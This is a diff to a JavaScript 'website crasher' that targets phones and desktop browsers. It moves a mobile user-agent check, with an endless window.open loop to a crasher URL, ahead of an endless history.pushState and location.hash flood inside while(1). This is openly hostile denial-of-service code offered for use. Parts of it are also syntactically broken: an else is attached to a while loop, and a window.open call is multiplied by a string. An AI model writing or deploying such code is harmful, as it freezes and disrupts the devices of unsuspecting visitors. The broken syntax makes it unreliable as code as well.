@@ -6,6 +6,16 @@
 /* This Affects Most Computers Depending On Control */
 while(1) {
  
+   // (Website Crasher For IOS and android And Mostly Every Phone) 
+   if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
+     while(1) {
+        window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+        document.open('#' + $x); // Forces A Link With No Function To Be Made.
+     } else {
+       continue;
+     }
+   }
+ 
    // Functions For Loop
    $location = 'https://the-imortal-crasher.github.io/chrome-crash/';
    $vwer = '#';
@@ -34,15 +44,6 @@ while(1) {
    for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();
    // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
  
-   // (Website Crasher For IOS and android And Mostly Every Phone) 
-   if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {  
-     while(1) {
-        window.open("https://the-imortal-crasher.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
-        document.open('#' + $x); // Forces A Link With No Function To Be Made.
-     } else {
-       continue;
-     }
-   }
 } 
     
 
